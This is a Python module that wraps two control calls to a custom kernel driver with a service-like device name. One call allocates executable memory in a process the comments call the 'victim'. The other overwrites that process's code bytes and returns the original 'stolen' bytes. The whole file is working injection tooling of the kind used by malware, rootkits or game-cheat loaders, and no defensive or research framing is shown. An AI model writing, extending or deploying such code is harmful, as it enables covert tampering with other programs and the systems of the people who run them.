"""
PK_IOCTL_ALLOC_RWX + PK_IOCTL_PATCH_CODE wrappers.

alloc_rwx(pid, size) -> allocation base VA w procesie ofiary (RWX)
patch_code(pid, addr, bytes) -> oryginalne bajty (stolen backup, do restore)
"""

from __future__ import annotations

import ctypes
import ctypes.wintypes as wt
import struct

_DEVICE_PATH = r"\\.\WdiSvcMon"
_FILE_DEVICE_UNKNOWN = 0x22


def _CTL_CODE(dev, func, method, access):
    return (dev << 16) | (access << 14) | (func << 2) | method


IOCTL_ALLOC_RWX  = _CTL_CODE(_FILE_DEVICE_UNKNOWN, 0x809, 0, 0)
IOCTL_PATCH_CODE = _CTL_CODE(_FILE_DEVICE_UNKNOWN, 0x80A, 0, 0)

PATCH_MAX = 32
ALLOC_MAX = 64 * 1024

# KR_ALLOC_REQ: Q(8) I(4) I(4) Q(8) = 24B
_ALLOC_FMT = "<QIIQ"
_ALLOC_SIZE = struct.calcsize(_ALLOC_FMT)
assert _ALLOC_SIZE == 24

# KR_PATCH_CODE_REQ: Q(8) Q(8) I(4) I(4) 32s(32) 32s(32) = 88B
_PATCH_FMT = "<QQII32s32s"
_PATCH_SIZE = struct.calcsize(_PATCH_FMT)
assert _PATCH_SIZE == 88


_k32 = ctypes.WinDLL("kernel32", use_last_error=True)
_k32.CreateFileW.argtypes = [wt.LPCWSTR, wt.DWORD, wt.DWORD, ctypes.c_void_p,
                             wt.DWORD, wt.DWORD, ctypes.c_void_p]
_k32.CreateFileW.restype  = wt.HANDLE
_k32.DeviceIoControl.argtypes = [wt.HANDLE, wt.DWORD, ctypes.c_void_p, wt.DWORD,
                                 ctypes.c_void_p, wt.DWORD,
                                 ctypes.POINTER(wt.DWORD), ctypes.c_void_p]
_k32.DeviceIoControl.restype  = wt.BOOL
_k32.CloseHandle.argtypes = [wt.HANDLE]
_k32.CloseHandle.restype  = wt.BOOL

_INVALID_HANDLE = ctypes.c_void_p(-1).value


class MemError(RuntimeError):
    pass


def _open() -> int:
    h = _k32.CreateFileW(_DEVICE_PATH, 0x80000000 | 0x40000000, 0, None, 3, 0, None)
    if not h or h == _INVALID_HANDLE:
        raise MemError(f"CreateFile err {ctypes.get_last_error()}")
    return h


def _ioctl(code: int, in_buf: bytes, out_size: int) -> bytes:
    h = _open()
    try:
        buf = ctypes.create_string_buffer(max(len(in_buf), out_size))
        ctypes.memmove(buf, in_buf, len(in_buf))
        returned = wt.DWORD(0)
        ok = _k32.DeviceIoControl(h, code, buf, len(in_buf),
                                  buf, len(buf), ctypes.byref(returned), None)
        if not ok:
            raise MemError(f"IOCTL {hex(code)} err {ctypes.get_last_error()}")
        return bytes(buf.raw[:out_size])
    finally:
        _k32.CloseHandle(h)


def alloc_rwx(pid: int, size: int) -> int:
    if size <= 0 or size > ALLOC_MAX:
        raise ValueError(f"size {size} out of [1, {ALLOC_MAX}]")
    req = struct.pack(_ALLOC_FMT, pid, size, 0, 0)
    resp = _ioctl(IOCTL_ALLOC_RWX, req, _ALLOC_SIZE)
    _, _, _, base = struct.unpack(_ALLOC_FMT, resp)
    if base == 0:
        raise MemError("alloc zwrocil 0")
    return base


def patch_code(pid: int, target_addr: int, patch_bytes: bytes) -> bytes:
    """Wpisuje `patch_bytes` do target_addr (protection RX -> RW -> RX atomically).
    Zwraca oryginalne bajty (do backup, ta sama IOCTL uzyta z tymi bajtami przywroci)."""
    if len(patch_bytes) == 0 or len(patch_bytes) > PATCH_MAX:
        raise ValueError(f"patch size {len(patch_bytes)} out of [1, {PATCH_MAX}]")
    padded = patch_bytes + b"\x00" * (PATCH_MAX - len(patch_bytes))
    req = struct.pack(_PATCH_FMT, pid, target_addr, len(patch_bytes), 0, padded, b"\x00" * PATCH_MAX)
    resp = _ioctl(IOCTL_PATCH_CODE, req, _PATCH_SIZE)
    _, _, _, _, _, stolen = struct.unpack(_PATCH_FMT, resp)
    return stolen[:len(patch_bytes)]
